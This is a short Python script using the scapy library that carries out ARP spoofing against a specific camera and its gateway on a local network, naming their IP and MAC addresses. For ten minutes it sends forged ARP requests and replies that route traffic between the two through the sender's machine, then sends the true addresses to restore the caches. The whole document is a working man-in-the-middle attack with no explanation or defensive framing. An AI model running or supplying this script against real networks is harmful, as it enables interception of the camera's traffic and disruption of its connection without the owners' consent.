from scapy.all import ARP, sendp, get_if_hwaddr, Ether, IP, UDP
import time, socket
IF="en1"; CAM="192.168.4.24"; GW="192.168.4.1"
me=get_if_hwaddr(IF); cam_mac="80:48:2c:4b:cf:0b"; gw_mac="48:dd:0c:c9:ec:0d"
end=time.time()+600
while time.time()<end:
    sendp(ARP(op=1, psrc=GW, pdst=CAM, hwdst=cam_mac, hwsrc=me), iface=IF, verbose=0)
    sendp(ARP(op=2, psrc=GW, pdst=CAM, hwdst=cam_mac, hwsrc=me), iface=IF, verbose=0)
    sendp(ARP(op=1, psrc=CAM, pdst=GW, hwdst=gw_mac, hwsrc=me), iface=IF, verbose=0)
    time.sleep(0.7)
for _ in range(4):
    sendp(ARP(op=2, psrc=GW, pdst=CAM, hwdst=cam_mac, hwsrc=gw_mac), iface=IF, verbose=0)
    sendp(ARP(op=2, psrc=CAM, pdst=GW, hwdst=gw_mac, hwsrc=cam_mac), iface=IF, verbose=0)
    time.sleep(0.2)
